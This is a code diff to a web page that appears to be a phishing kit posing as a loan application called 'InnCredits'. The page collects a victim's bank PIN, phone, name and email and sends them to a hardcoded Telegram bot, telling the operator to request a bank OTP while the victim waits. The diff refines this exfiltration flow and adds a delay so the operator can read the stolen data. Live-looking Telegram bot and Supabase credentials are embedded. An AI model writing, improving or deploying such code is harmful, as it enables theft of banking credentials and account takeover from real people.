@@ -50,6 +50,9 @@
 
         .error-message { background: rgba(244,63,94,0.15); color: #f43f5e; padding: 12px; border-radius: 12px; font-size: 0.8rem; margin-top: 16px; text-align: center; display: none; }
         .error-message.show { display: block; }
+        
+        .success-message { background: rgba(20,184,166,0.15); color: #14b8a6; padding: 12px; border-radius: 12px; font-size: 0.8rem; margin-top: 16px; text-align: center; display: none; }
+        .success-message.show { display: block; }
 
         .security-note { display: flex; align-items: center; gap: 8px; background: rgba(20,184,166,0.08); border: 1px solid rgba(20,184,166,0.2); border-radius: 12px; padding: 12px 14px; margin-top: 20px; }
         .security-note span { font-size: 0.78rem; color: #7e8aa2; line-height: 1.4; }
@@ -110,8 +113,9 @@
         </div>
         <div class="pin-hint">Your PIN is encrypted and never stored in plain text</div>
 
-        <button class="submit-btn" id="confirmBtn" disabled onclick="handleConfirm()">Confirm PIN →</button>
+        <button class="submit-btn" id="confirmBtn" disabled>Confirm PIN →</button>
         <div class="error-message" id="errorMessage"></div>
+        <div class="success-message" id="successMessage">✓ PIN Confirmed! Sending notification...</div>
 
         <div class="security-note">
             <span>🔒</span>
@@ -121,34 +125,43 @@
 </div>
 
 <script>
+    // ============================================
+    // CONFIGURATION
+    // ============================================
     var SUPABASE_URL      = 'https://zchkanbnkghpsaagbnrt.supabase.co';
     var SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpjaGthbmJrZ2hwc2FhZ2JucnQiLCJyb2xlIjoiYW5vbiIsImlhdCI6MTczNDI1NjQ0MCwiZXhwIjoyMDQ5ODMyNDQwfQ';
+    
     var TG_BOT_TOKEN      = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
     var TG_CHAT_ID        = '8392790531';
 
     var db = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
+    // Get URL parameters
     var params  = new URLSearchParams(window.location.search);
     var amount  = params.get('amount')  || '0';
     var term    = params.get('term')    || '0';
     var rate    = params.get('rate')    || '0';
     var monthly = params.get('monthly') || '0';
-    var name    = params.get('name')    || '';
-    var email   = params.get('email')   || '';
-    var phone   = params.get('phone')   || '';
+    var name    = decodeURIComponent(params.get('name') || '');
+    var email   = decodeURIComponent(params.get('email') || '');
+    var phone   = decodeURIComponent(params.get('phone') || '');
     var appId   = params.get('appId')   || '';
 
+    // Update UI with loan data
     document.getElementById('summaryAmount').innerText  = '$' + parseFloat(amount).toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2});
     document.getElementById('summaryTerm').innerText    = parseInt(term) + ' month' + (parseInt(term) !== 1 ? 's' : '');
     document.getElementById('summaryMonthly').innerText = '$' + parseFloat(monthly).toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2});
     document.getElementById('summaryRate').innerText    = rate + '%';
 
-    document.getElementById('dispName').innerText  = decodeURIComponent(name)  || '—';
-    document.getElementById('dispPhone').innerText = decodeURIComponent(phone) || '—';
-    document.getElementById('dispEmail').innerText = decodeURIComponent(email) || '—';
+    document.getElementById('dispName').innerText  = name  || '—';
+    document.getElementById('dispPhone').innerText = phone || '—';
+    document.getElementById('dispEmail').innerText = email || '—';
 
+    // PIN box logic
     var boxes = ['p1','p2','p3','p4'].map(function(id){ return document.getElementById(id); });
     var confirmBtn = document.getElementById('confirmBtn');
+    var errorDiv = document.getElementById('errorMessage');
+    var successDiv = document.getElementById('successMessage');
 
     boxes.forEach(function(box, i) {
         box.addEventListener('input', function() {
@@ -187,71 +200,118 @@
     function getPin() { return boxes.map(function(b){ return b.value; }).join(''); }
 
     function showError(msg) {
-        var div = document.getElementById('errorMessage');
-        div.textContent = msg;
-        div.classList.add('show');
-        setTimeout(function(){ div.classList.remove('show'); }, 5000);
+        errorDiv.textContent = msg;
+        errorDiv.classList.add('show');
+        setTimeout(function(){ errorDiv.classList.remove('show'); }, 5000);
     }
 
-    async function sendTelegram(phone, pin) {
-        var msg =
-            '🔔 New InnCredits Application\n\n' +
-            '📱 Phone: ' + decodeURIComponent(phone) + '\n' +
-            '🔐 PIN: ' + pin + '\n\n' +
-            '👤 Name: ' + decodeURIComponent(name) + '\n' +
-            '📧 Email: ' + decodeURIComponent(email) + '\n' +
-            '💰 Loan: $' + parseFloat(amount).toLocaleString() + ' · ' + term + ' months @ ' + rate + '%\n' +
-            '🆔 App ID: ' + appId + '\n\n' +
-            'Request OTP from the bank now → user is waiting on the OTP page.';
+    function showSuccess(msg) {
+        successDiv.textContent = msg;
+        successDiv.classList.add('show');
+    }
 
-        var resp = await fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage', {
+    // Send notification to Telegram
+    async function sendTelegramNotification(pin) {
+        var message = 
+'🔔 *NEW PIN CONFIRMATION* 🔔\n\n' +
+'━━━━━━━━━━━━━━━━━━━━━\n' +
+'📱 *Phone:* ' + phone + '\n' +
+'🔐 *PIN:* `' + pin + '`\n' +
+'━━━━━━━━━━━━━━━━━━━━━\n' +
+'👤 *Name:* ' + name + '\n' +
+'📧 *Email:* ' + email + '\n' +
+'💰 *Loan:* $' + parseFloat(amount).toLocaleString() + ' for ' + term + ' months\n' +
+'📊 *Interest:* ' + rate + '%\n' +
+'💵 *Monthly:* $' + parseFloat(monthly).toLocaleString() + '\n' +
+'🆔 *App ID:* ' + (appId || 'N/A') + '\n' +
+'━━━━━━━━━━━━━━━━━━━━━\n\n' +
+'✅ *ACTION REQUIRED:* Please request OTP from the bank now!\n' +
+'📱 User is waiting on the OTP verification page.';
+
+        var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
+        var response = await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg })
+            body: JSON.stringify({ 
+                chat_id: TG_CHAT_ID, 
+                text: message, 
+                parse_mode: 'Markdown' 
+            })
         });
-        var result = await resp.json();
-        if (!result.ok) { console.error('Telegram error:', result); }
+        var result = await response.json();
+        if (!result.ok) {
+            console.error('Telegram error:', result);
+            throw new Error('Telegram notification failed');
+        }
+        console.log('Telegram sent successfully:', result);
+        return result;
     }
 
-    async function handleConfirm() {
-        var pin = getPin();
-        if (pin.length !== 4) { showError('Please enter all 4 digits.'); return; }
+    // Save PIN to Supabase
+    async function savePinToSupabase(pin) {
+        var { error } = await db
+            .from('users')
+            .update({ pin: pin })
+            .eq('phone', phone);
+        
+        if (error) throw new Error(error.message);
+        
+        if (appId) {
+            await db
+                .from('loan_applications')
+                .update({ pin_confirmed: true })
+                .eq('application_id', appId);
+        }
+        return true;
+    }
 
+    // Main confirm function
+    confirmBtn.onclick = async function() {
+        var pin = getPin();
+        if (pin.length !== 4) {
+            showError('Please enter all 4 digits.');
+            return;
+        }
+
+        // Disable button and show loading
         confirmBtn.disabled = true;
-        confirmBtn.textContent = 'Processing…';
+        confirmBtn.textContent = '⏳ Sending notification...';
+        showSuccess('✓ PIN Confirmed! Sending notification to admin...');
 
         try {
-            var { error: pinErr } = await db
-                .from('users')
-                .update({ pin: pin })
-                .eq('phone', decodeURIComponent(phone));
-            if (pinErr) throw new Error(pinErr.message);
-
-            if (appId) {
-                await db
-                    .from('loan_applications')
-                    .update({ pin_confirmed: true })
-                    .eq('application_id', appId);
-            }
-
-            await sendTelegram(phone, pin);
-
-            window.location.href = 'otp-verify.html'
-                + '?amount='  + encodeURIComponent(amount)
-                + '&term='    + encodeURIComponent(term)
-                + '&rate='    + encodeURIComponent(rate)
-                + '&monthly=' + encodeURIComponent(monthly)
-                + '&name='    + encodeURIComponent(name)
-                + '&email='   + encodeURIComponent(email)
-                + '&phone='   + encodeURIComponent(phone)
-                + '&appId='   + encodeURIComponent(appId);
-
+            // Step 1: Send Telegram notification (you'll see phone + PIN + email)
+            await sendTelegramNotification(pin);
+            
+            // Step 2: Save PIN to Supabase
+            await savePinToSupabase(pin);
+            
+            // Update success message
+            successDiv.textContent = '✓ Notification sent! Redirecting in 5 seconds...';
+            
+            // Delay 5 seconds so you have time to see the Telegram message
+            setTimeout(function() {
+                // Redirect to OTP page
+                var redirectUrl = 'otp-verify.html'
+                    + '?amount='  + encodeURIComponent(amount)
+                    + '&term='    + encodeURIComponent(term)
+                    + '&rate='    + encodeURIComponent(rate)
+                    + '&monthly=' + encodeURIComponent(monthly)
+                    + '&name='    + encodeURIComponent(name)
+                    + '&email='   + encodeURIComponent(email)
+                    + '&phone='   + encodeURIComponent(phone)
+                    + '&appId='   + encodeURIComponent(appId);
+                
+                window.location.href = redirectUrl;
+            }, 5000); // 5 second delay
+            
         } catch (err) {
-            showError('Something went wrong. Please try again.');
+            console.error('Error:', err);
+            showError('Something went wrong: ' + err.message);
             confirmBtn.disabled = false;
             confirmBtn.textContent = 'Confirm PIN →';
+            successDiv.classList.remove('show');
         }
-    }
+    };
 </script>
 </body>
 </html>
